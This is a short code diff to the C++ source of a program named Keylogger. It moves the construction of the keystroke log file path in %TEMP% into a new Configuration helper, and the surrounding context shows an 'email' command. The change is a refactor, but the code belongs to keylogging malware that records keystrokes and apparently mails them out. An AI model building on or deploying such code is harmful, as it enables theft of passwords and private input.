@@ -7,6 +7,7 @@
 #include "services/CommandParser.h"
 #include "services/KeyBlockService.h"
 #include "helpers/ComputerInfoHelper.h"
+#include "helpers/Configuration.h"
 
 Keylogger::Keylogger() {
     CommandParser::addCommand(L"email", [this](std::wstring argStr) {
@@ -89,9 +90,7 @@ void Keylogger::start() {
 
         // Create log file int %TEMP% directory
         const int buffSize = 1024;
-        wchar_t buff[1024];
-        GetTempPath(buffSize, buff);
-        this->logfilePath = std::wstring(buff) + L"\\" + FILENAME;
+		this->logfilePath = Configuration::GetLogFilePath();
 
         logFile.open(this->logfilePath, std::ios::app);
         this->isActive = true;
